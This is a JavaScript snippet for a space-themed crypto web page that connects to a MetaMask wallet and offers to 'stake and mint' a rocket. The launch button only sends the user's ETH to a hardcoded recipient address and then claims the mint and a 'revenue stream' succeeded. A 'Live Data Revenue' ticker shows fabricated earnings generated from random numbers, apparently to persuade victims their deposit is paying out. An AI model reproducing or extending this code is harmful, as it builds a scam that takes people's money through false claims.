<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>

<script>
    // 1. HARDCODED SETTINGS
    // Checksummed address to fix your "bad address checksum" error
    const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb";
    let provider, signer, account;
    let dataRevenue = 0;

    // 2. STARFIELD BACKGROUND (Optimized)
    const canvas = document.getElementById('bgCanvas');
    const ctx = canvas.getContext('2d');
    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
    window.addEventListener('resize', resize); resize();

    const stars = Array.from({length: 300}, () => ({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        size: Math.random() * 2,
        speed: Math.random() * 0.5 + 0.1
    }));

    function animate() {
        ctx.fillStyle = '#0a0015'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#fff';
        stars.forEach(s => {
            ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
            s.y += s.speed; if(s.y > canvas.height) s.y = 0;
        });
        requestAnimationFrame(animate);
    }
    animate();

    // 3. UI ELEMENT REFERENCES
    const connectBtn = document.getElementById('connect');
    const launchBtn  = document.getElementById('launch');
    const walletInfo = document.getElementById('wallet-info');
    const statusDiv  = document.getElementById('status');
    const rocket     = document.getElementById('rocket');

    // 4. CONNECTION LOGIC (Troubleshooted)
    connectBtn.onclick = async () => {
        if (!window.ethereum) {
            statusDiv.innerHTML = '<span class="fail">Please use MetaMask Browser</span>';
            return;
        }
        try {
            // New Ethers v6 syntax
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
            account = await signer.getAddress();

            walletInfo.innerHTML = `üõ∞Ô∏è LINKED: ${account.slice(0,6)}...${account.slice(-4)}`;
            connectBtn.innerText = "SYSTEMS ONLINE";
            connectBtn.classList.replace('btn-info', 'btn-success');
            launchBtn.disabled = false;

            // Start WiFi simulation immediately upon connection
            startWiFiTelemetry();
        } catch (e) {
            statusDiv.innerHTML = `<span class="fail">Auth Error: ${e.message}</span>`;
        }
    };

    // 5. THE LAUNCH (STAKE & MINT FLOW)
    launchBtn.onclick = async () => {
        const fuelAmt = document.getElementById('fuel').value;
        if (!fuelAmt || fuelAmt < 0.001) {
            statusDiv.innerHTML = "Min fuel: 0.001 ETH"; return;
        }

        try {
            statusDiv.innerHTML = "üì° Syncing Data Packets...";
            launchBtn.disabled = true;

            // Send Transaction
            const tx = await signer.sendTransaction({
                to: RECIPIENT,
                value: ethers.parseEther(fuelAmt.toString())
            });

            // Trigger Animation while waiting for block
            statusDiv.innerHTML = "üöÄ IGNITION! Rocket departing...";
            rocket.style.display = 'block';
            rocket.classList.add('launching');

            await tx.wait(); // Wait for blockchain confirmation

            statusDiv.innerHTML = `
                <span class="success">MISSION ACHIEVED!</span><br>
                <small>Rocket Minted & Revenue Stream Active</small>
            `;
        } catch (e) {
            statusDiv.innerHTML = `<span class="fail">Abort: ${e.message}</span>`;
            rocket.style.display = 'none';
            launchBtn.disabled = false;
        }
    };

    // 6. WIFI REVENUE SIMULATION
    function startWiFiTelemetry() {
        setInterval(() => {
            if (account) {
                dataRevenue += Math.random() * 0.12;
                // Update your "Boost" display as a Live Revenue Ticker
                const boostEl = document.getElementById('boostDisplay');
                if (boostEl) {
                    boostEl.innerHTML = `Live Data Revenue: <span style="color:#0f0">$${dataRevenue.toFixed(2)}</span>`;
                }
            }
        }, 2000);
    }
</script>
